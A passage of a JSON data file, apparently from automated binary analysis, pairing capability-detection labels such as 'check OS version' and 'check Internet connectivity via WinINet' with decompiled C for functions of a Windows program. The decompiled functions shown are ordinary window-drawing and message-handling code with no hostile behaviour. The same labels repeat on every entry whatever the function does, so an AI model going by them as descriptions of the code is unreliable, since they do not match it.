        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450ed8(void)\n\n{\n    int32_t in_EAX;\n    \n    if ((*(*0x4927e0 + 0xd) != '\\0') && (*(in_EAX + 0x5f) != '\\0')) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 70
    },
    "00450f08": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint fcn.00450f08(void)\n\n{\n    int32_t in_EAX;\n    int32_t iVar1;\n    \n    if ((*(*0x4927e0 + 0xd) != '\\0') && (iVar1 = *(in_EAX + 0x5f) - 1,  iVar1 < 2)) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 97
    },
    "0045103c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0045103c(uchar *arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t in_EAX;\n    \n    *arg_8h = 0;\n    if (*(in_EAX + 0xe2) != 0) {\n        *arg_8h = 1;\n        (**(in_EAX + 0xe0))(arg_8h, arg_ch, arg_10h);\n    }\n    return;\n}\n",
        "token_count": 107
    },
    "00451078": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451078(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xda) != 0) {\n        (**(in_EAX + 0xd8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "004510c4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004510c4(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x10a) != 0) {\n        (**(in_EAX + 0x108))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "004511dc": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004511dc(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xfa) != 0) {\n        (**(in_EAX + 0xf8))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 65
    },
    "0045125c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nchar __cdecl fcn.0045125c(uint *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t in_EAX;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    char var_ah;\n    uint var_9h;\n    uint uStack9;\n    uint var_1h;\n    \n    var_9h = *arg_8h;\n    uStack9 = arg_8h[1];\n    var_ah = '\\0';\n    if (*(in_EAX + 0x142) != 0) {\n        (**(in_EAX + 0x140))(&var_ah, &var_9h);\n    }\n    if (var_ah == '\\0') {\n        *(in_EAX + 0x98) = *(in_EAX + 0x98) + in_ECX;\n        while (uVar2 = *(in_EAX + 0x98) >> 0x1f,  0x77 < (*(in_EAX + 0x98) ^ uVar2) - uVar2) {\n            iVar1 = *(in_EAX + 0x98);\n            uVar2 = *(in_EAX + 0x98) >> 0x1f;\n            *(in_EAX + 0x98) = ((*(in_EAX + 0x98) ^ uVar2) - uVar2) + -0x78;\n            if (iVar1 < 0) {\n                if (*(in_EAX + 0x98) != 0) {\n                    *(in_EAX + 0x98) = -*(in_EAX + 0x98);\n                }\n                var_ah = fcn.0040484c();\n            }\n            else {\n                var_ah = fcn.0040484c();\n            }\n        }\n    }\n    return var_ah;\n}\n",
        "token_count": 427
    },
    "004513c8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004513c8(uint param_1, int32_t *param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint uVar3;\n    uint uVar4;\n    uint uVar5;\n    uint *in_FS_OFFSET;\n    uint uStack72;\n    uint uStack68;\n    uchar *puStack64;\n    uint uStack60;\n    uint uStack56;\n    uint uStack52;\n    int32_t var_20h;\n    int32_t var_1ch;\n    int32_t var_18h;\n    int32_t var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    uStack52 = 0x4513dd;\n    iVar1 = (**(*param_2 + 0x38))();\n    if (var_1h == '\\0') {\n        var_20h = param_2[0x13];\n        var_1ch = param_2[0x14];\n        var_18h = param_2[0x15];\n        var_14h = param_2[0x16];\n    }\n    else {\n        var_20h = param_2[0x19];\n        var_1ch = param_2[0x1a];\n        var_18h = param_2[0x1b];\n        var_14h = param_2[0x1c];\n    }\n    uStack52 = 0x451404;\n    uVar2 = sub.user32.dll_GetDesktopWindow();\n    uStack52 = 0x402;\n    uStack56 = 0;\n    puStack64 = 0x451417;\n    uStack60 = uVar2;\n    uVar3 = sub.user32.dll_GetDCEx();\n    uStack68 = 0x4514e3;\n    uStack72 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb8;\n    puStack64 = &fcn.004513c8::var_1h + 1;\n    uVar4 = fcn.00424f6c();\n    uVar5 = sub.gdi32.dll_SelectObject(uVar3, uVar4);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h + iVar1, var_1ch, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_18h - iVar1, var_1ch + iVar1, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_14h - iVar1, (var_18h - var_20h) - iVar1, iVar1, 0x5a0049);\n    sub.gdi32.dll_PatBlt(uVar3, var_20h, var_1ch, iVar1, (var_14h - var_1ch) - iVar1, 0x5a0049);\n    uVar4 = uVar3;\n    sub.gdi32.dll_SelectObject(uVar3, uVar5);\n    *in_FS_OFFSET = uVar4;\n    sub.user32.dll_ReleaseDC(uVar2, uVar3, 0x4514ea);\n    return;\n}\n",
        "token_count": 790
    },
    "00451514": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00451514(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uchar auStack28 [5];\n    uint uStack23;\n    \n    cVar1 = fcn.004047dc();\n    if ((*0x497c88 != '\\0') && (cVar1 == '\\0')) {\n        fcn.00404800();\n    }\n    fcn.00450344();\n    if (*(param_2 + 4) < 3) {\n        auStack28[0] = 1;\n        if (cVar1 == '\\0') {\n            uVar2 = *(param_2 + 4);\n            fcn.0040484c(auStack28, uVar2, uStack23);\n        }\n        else {\n            uVar2 = *(param_2 + 4);\n            fcn.0040484c(auStack28, uVar2, uStack23);\n        }\n        *(param_2 + 0xc) = uVar2 & 0xff;\n    }\n    else if (*(param_2 + 4) == 3) {\n        if (cVar1 == '\\0') {\n            fcn.0040484c(uStack23);\n        }\n        else {\n            fcn.0040484c(uStack23);\n        }\n    }\n    return;\n}\n",
        "token_count": 301
    },
    "00451604": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.00451604(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t in_EAX;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t in_EDX;\n    uint *in_FS_OFFSET;\n    uint uStack80;\n    uint *arg_8h_00;\n    uint var_34h;\n    uint uStack52;\n    uint uStack48;\n    uint uStack44;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint uStack24;\n    uint uStack20;\n    int32_t var_ch;\n    uint8_t var_5h;\n    uint var_4h;\n    \n    if ((in_EDX == 0) || (in_EDX == -1)) {\n        iVar3 = *(in_EAX + 0x94);\n        if (((iVar3 == 0) || (*(iVar3 + 0x1db) == '\\0')) || (*(iVar3 + 0x1b0) == 0)) {\n            fcn.00418410();\n            var_1ch = var_24h;\n            var_18h = var_20h;\n            if (*(in_EAX + 0x30) != 0) {\n                fcn.00450294();\n                var_1ch = var_24h;\n                var_18h = var_20h;\n            }\n        }\n        else {\n            (**(**(iVar3 + 0x1b0) + 0x14))();\n            var_34h = 2;\n            fcn.00458568();\n            sub.user32.dll_MapWindowPoints();\n        }\n        uVar2 = fcn.00450790();\n        arg_8h_00 = &fcn.00451604::var_34h;\n        uStack80 = 0x4516b5;\n        fcn.004507a4();\n        uStack80 = 0x4516c2;\n        fcn.00418460(arg_8h_00, uVar2);\n        var_1ch = var_34h;\n        var_18h = uStack52;\n        uStack24 = uStack48;\n        uStack20 = uStack44;\n        uStack80 = 0x4516d6;\n        var_5h = fcn.004517e4();\n        goto code_r0x004517d7;\n    }\n    fcn.00451af0();\n    if (*(in_EAX + 0x94) == 0) {\ncode_r0x00451709:\n        var_5h = 1;\n    }\n    else {\n        cVar1 = fcn.0040484c();\n        if (cVar1 != '\\0') goto code_r0x00451709;\n        var_5h = 0;\n    }\n    if (var_5h != 0) {\n        var_ch = fcn.0044db78();\n        uStack80 = *in_FS_OFFSET;\n        *in_FS_OFFSET = &stack0xffffffb0;\n        if (*(in_EAX + 0x94) == 0) {\n            iVar3 = 0;\n        }\n        else {\n            iVar3 = fcn.00458568();\n        }\n        fcn.00450124();\n        if (iVar3 != 0) {\n            sub.user32.dll_MapWindowPoints(iVar3, 0, &fcn.00451604::var_1ch, 2);\n        }\n        *(var_ch + 8) = in_EDX;\n        *(var_ch + 0x5c) = arg_8h;\n        *(var_ch + 0x60) = var_4h;\n        *(var_ch + 0x4c) = var_1ch;\n        *(var_ch + 0x50) = var_18h;\n        *(var_ch + 0x54) = uStack24;\n        *(var_ch + 0x58) = uStack20;\n        uVar2 = fcn.00458568(&fcn.00451604::var_1ch, 1);\n        sub.user32.dll_MapWindowPoints(0, uVar2);\n        fcn.0040484c();\n        *in_FS_OFFSET = var_18h;\n        uVar4 = fcn.00404650(0x4517d7);\n        return uVar4;\n    }\ncode_r0x004517d7:\n    return var_5h;\n}\n",
        "token_count": 990
    },
    "0045188c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint64_t __fastcall fcn.0045188c(uint param_1)\n\n{\n    int32_t in_EAX;\n    uint uStack8;\n    \n    uStack8 = CONCAT31(param_1 >> 8, 1);\n    if (*(in_EAX + 0xb2) != 0) {\n        (**(in_EAX + 0xb0))(&uStack8, param_1);\n    }\n    return CONCAT44(uStack8, uStack8) & 0xffffffff000000ff;\n}\n",
        "token_count": 112
    },
    "00451958": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00451958(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0xba) != 0) {\n        (**(in_EAX + 0xb8))(arg_8h, arg_ch);\n    }\n    return;\n}\n",
        "token_count": 72
    },
    "004519e8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.004519e8(int32_t **param_1, int32_t **param_2)\n\n{\n    int32_t *in_EAX;\n    int32_t *piStack28;\n    int32_t *piStack24;\n    int32_t iStack20;\n    int32_t iStack16;\n    \n    piStack28 = *(in_EAX[0x1d] + 0x14);\n    if (piStack28 == NULL) {\n        piStack28 = NULL;\n    }\n    piStack24 = *(in_EAX[0x1d] + 0x10);\n    if (piStack24 == NULL) {\n        piStack24 = NULL;\n    }\n    iStack20 = *(in_EAX[0x1d] + 0xc);\n    if (iStack20 == 0) {\n        iStack20 = 0;\n    }\n    iStack16 = *(in_EAX[0x1d] + 8);\n    if (iStack16 == 0) {\n        iStack16 = 0;\n    }\n    (**(*in_EAX + 0x38))();\n    if ((piStack28 < 1) || (*param_2 <= piStack28)) {\n        if ((0 < &iStack16) && (*param_2 < &iStack16)) {\n            *param_2 = &iStack16;\n        }\n    }\n    else {\n        *param_2 = piStack28;\n    }\n    if ((piStack24 < 1) || (*param_1 <= piStack24)) {\n        if ((0 < &iStack20) && (*param_1 < &iStack20)) {\n            *param_1 = &iStack20;\n        }\n    }\n    else {\n        *param_1 = piStack24;\n    }\n    return;\n}\n",
        "token_count": 396
    },
    "00451af0": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint32_t fcn.00451af0(void)\n\n{\n    int32_t *in_EAX;\n    uint32_t uVar1;\n    \n    uVar1 = (**(*in_EAX + 0x54))();\n    if (uVar1 != '\\0') {\n        in_EAX[0x28] = in_EAX[0x13];\n        in_EAX[0x27] = in_EAX[0x12];\n        return in_EAX[0x12];\n    }\n    if (in_EAX[0x25] != 0) {\n        if ((*(in_EAX + 0x24) == '\\x02') || (*(in_EAX[0x25] + 0x5b) - 1U < 2)) {\n            uVar1 = in_EAX[0x13];\n            in_EAX[0x2a] = uVar1;\n        }\n        else if ((*(in_EAX + 0x24) == '\\x01') || (uVar1 = *(in_EAX[0x25] + 0x5b) - 5,  *(in_EAX[0x25] + 0x5b) - 3U < 2))\n        {\n            uVar1 = in_EAX[0x12];\n            in_EAX[0x29] = uVar1;\n        }\n    }\n    return uVar1;\n}\n",
        "token_count": 308
    },
    "00451b98": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.00451b98(uint param_1, uint32_t *param_2)\n\n{\n    uint32_t uVar1;\n    int32_t *piVar2;\n    char cVar3;\n    int32_t *in_EAX;\n    uint lpKeyState;\n    int32_t *var_15h;\n    uint32_t var_10h;\n    uint var_ch;\n    uint32_t var_8h;\n    \n    if (((((*(in_EAX + 7) & 0x10) == 0) || (*NULL = fcn.0043bd00(),  *NULL == NULL)) || ((*NULL)[0xa6] == 0)) ||\n       (cVar3 = (**(*(*NULL)[0xa6] + 0x24))(),  cVar3 == '\\0')) {\n        if ((*param_2 < 0x100) || (0x109 < *param_2)) {\n            uVar1 = *param_2;\n            if ((uVar1 < 0x200) || (0x20a < uVar1)) {\n                if (uVar1 == 0xb00b) {\n                    fcn.004503a0(param_2[2]);\n                }\n            }\n            else {\n                if (((*(in_EAX + 0x14) & 0x80) == 0) && (((uVar1 == 0x203 || (uVar1 == 0x206)) || (uVar1 == 0x209)))) {\n                    *param_2 = *param_2 - 2;\n                }\n    // switch table (8 cases) at 0x451c71\n                switch(*param_2) {\n                case 0x200:\n                    func_0x00447248();\n                    break;\n                case 0x201:\n                case 0x203:\n                    if (*(in_EAX + 0x5d) == '\\x01') {\n                        fcn.0040484c();\n                        return;\n                    }\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) | 1;\n                    break;\n                case 0x202:\n                    *(in_EAX + 0x15) = *(in_EAX + 0x15) & 0xfffe;\n                    break;\n                default:\n                    if (((*(*0x497c5c + 0x20) != '\\0') && (*(*0x497c5c + 0x1c) != 0)) &&\n                       (*param_2 == *(*0x497c5c + 0x1c))) {\n                        sub.user32.dll_GetKeyboardState(&lpKeyState);\n                        var_10h = *param_2;\n                        var_ch._0_1_ = fcn.0043bc00();\n                        var_ch._2_2_ = *(param_2 + 1);\n                        var_8h = param_2[2];\n                        fcn.0040484c();\n                        return;\n                    }\n                    break;\n                case 0x207:\n                    if ((((*(in_EAX + 0x52) & 8) != 0) && (*0x451e64 == (*0x451e60 & *(in_EAX + 0x15)))) &&\n                       (cVar3 = fcn.0045d508(),  cVar3 == '\\0')) {\n                        fcn.0045d494();\n                        var_15h._0_1_ = '\\0';\n                        piVar2 = *(*0x497c5c + 0x28);\n                        if (piVar2 != NULL) {\n                            cVar3 = fcn.004047dc();\n                            if (cVar3 == '\\0') {\n                                if (in_EAX[0xc] == 0) {\n                                    *NULL = fcn.0043bd00();\n                                    if (*NULL != NULL) {\n                                        fcn.00458568();\n                                        var_15h._0_1_ = (**(**(*0x497c5c + 0x28) + 0xe0))();\n                                    }\n                                }\n                                else {\n                                    fcn.00458568();\n                                    var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                                }\n                            }\n                            else {\n                                fcn.00458568();\n                                var_15h._0_1_ = (**(*piVar2 + 0xe0))();\n                            }\n                        }\n                        if (var_15h == '\\0') {\n                            if (*(*0x497c5c + 0x28) != 0) {\n                                fcn.0045d5d4();\n                            }\n                        }\n                        else {\n                            param_2[3] = 1;\n                            fcn.004473a0();\n                        }\n                    }\n                }\n            }\n        }\n        else {\n            *NULL = fcn.0043bd00();\n            if ((*NULL != NULL) && (cVar3 = (**(**NULL + 0x100))(),  cVar3 != '\\0')) {\n                return;\n            }\n        }\n        (**(*in_EAX + -0x14))();\n    }\n    return;\n}\n",
        "token_count": 1127
    },
    "00451f44": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00451f44(int32_t arg_8h)\n\n{\n    char in_AL;\n    int32_t iVar1;\n    \n    if (in_AL == '\\0') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x180))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x452154 == (*(*(arg_8h + -8) + 0x61) & *0x452150))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x180),  iVar1 != *(*(arg_8h + -8) + 0x40))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x01') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x184))) ||\n           (((*(*(arg_8h + -4) + 0x20) == 0 &&\n             ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x452154 == (*(*(arg_8h + -8) + 0x61) & *0x452158))))) &&\n            (iVar1 = *(*(arg_8h + -8) + 0x184),  iVar1 != *(*(arg_8h + -8) + 0x44))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if (in_AL == '\\x02') {\n        iVar1 = *(*(arg_8h + -4) + 0x20);\n        if (((iVar1 != 0) && (iVar1 = *(iVar1 + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x188))) ||\n           ((*(*(arg_8h + -4) + 0x20) == 0 &&\n            (((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x45215c == (*(*(arg_8h + -8) + 0x61) & *0x45215c))) &&\n             (iVar1 = *(*(arg_8h + -8) + 0x188),  iVar1 != *(*(arg_8h + -8) + 0x48))))))) {\n            return CONCAT31(iVar1 >> 8, 1);\n        }\n    }\n    else if ((in_AL == '\\x03') &&\n            (((iVar1 = *(*(arg_8h + -4) + 0x20),  iVar1 != 0 &&\n              (iVar1 = *(iVar1 + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x18c))) ||\n             (((*(*(arg_8h + -4) + 0x20) == 0 &&\n               ((*(*(arg_8h + -8) + 0x5b) != '\\0' || (*0x452160 == (*(*(arg_8h + -8) + 0x61) & *0x452160))))) &&\n              (iVar1 = *(*(arg_8h + -8) + 0x18c),  iVar1 != *(*(arg_8h + -8) + 0x4c))))))) {\n        return CONCAT31(iVar1 >> 8, 1);\n    }\n    return 0;\n}\n",
        "token_count": 890
    },
    "00452380": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.00452380(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xc2) != 0) {\n        (**(in_EAX + 0xc0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 104
    },
    "00452500": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nchar __fastcall fcn.00452500(uint *param_1, uint *param_2)\n\n{\n    uint uVar1;\n    uint uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    char cVar4;\n    \n    cVar4 = '\\0';\n    uVar1 = *param_2;\n    uVar2 = *param_1;\n    cVar3 = fcn.00451928();\n    if (cVar3 != '\\0') {\n        if (((*(in_EAX + 0x5c) == '\\0') || (cVar3 = fcn.004518bc(),  cVar3 != '\\0')) ||\n           (cVar3 = fcn.00451928(),  cVar3 != '\\0')) {\n            cVar4 = '\\x01';\n        }\n        else {\n            cVar4 = '\\0';\n        }\n        if (cVar4 != '\\0') {\n            *param_2 = uVar1;\n            *param_1 = uVar2;\n        }\n    }\n    return cVar4;\n}\n",
        "token_count": 235
    },
    "0045264c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.0045264c(uint arg_8h)\n\n{\n    int32_t in_EAX;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xca) != 0) {\n        (**(in_EAX + 200))(arg_8h);\n    }\n    return;\n}\n",
        "token_count": 87
    },
    "004526f8": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid __cdecl fcn.004526f8(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uchar in_CL;\n    uint var_1h;\n    \n    if (*(in_EAX + 0xd2) != 0) {\n        (**(in_EAX + 0xd0))(arg_8h, arg_ch, in_CL);\n    }\n    return;\n}\n",
        "token_count": 105
    },
    "00452a04": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452a04(uint param_1, int32_t param_2)\n\n{\n    int32_t in_EAX;\n    uint var_4h;\n    \n    if (*(in_EAX + 0x5a) != '\\0') {\n        if (*(param_2 + 4) == 0) {\n            fcn.004529cc(&stack0xfffffffc);\n        }\n        else {\n            fcn.004529cc(&stack0xfffffffc);\n        }\n        *(in_EAX + 0x5a) = 1;\n    }\n    return;\n}\n",
        "token_count": 128
    },
    "00452ad4": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452ad4(uint param_1, int32_t param_2)\n\n{\n    int32_t *in_EAX;\n    \n    if ((*(*0x4927e0 + 0xd) != '\\0') && (*(param_2 + 4) == 0)) {\n        (**(*in_EAX + 0x80))();\n    }\n    return;\n}\n",
        "token_count": 86
    },
    "00452b60": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid fcn.00452b60(void)\n\n{\n    int32_t in_EAX;\n    \n    if (*(in_EAX + 0x56) != '\\0') {\n        fcn.004508f8();\n        *(in_EAX + 0x56) = 1;\n    }\n    return;\n}\n",
        "token_count": 68
    },
    "00452d1c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00452d1c(uint param_1, int32_t param_2)\n\n{\n    char cVar1;\n    int32_t *in_EAX;\n    int32_t iVar2;\n    uint uVar3;\n    uint var_8h;\n    uint var_4h;\n    \n    cVar1 = (**(*in_EAX + 0x54))();\n    if ((cVar1 == '\\0') || (in_EAX[0xc] == 0)) {\n        iVar2 = fcn.00452c0c();\n        if (iVar2 != 0) {\n            *(*(param_2 + 8) + 8) = iVar2;\n            uVar3 = fcn.00458568();\n            *(*(param_2 + 8) + 0xc) = uVar3;\n        }\n    }\n    else {\n        fcn.00452c90(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 209
    },
    "00452d7c": {
        "rules": [
            "check OS version/c2d5920d27eb4726b54299bacf904e17",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
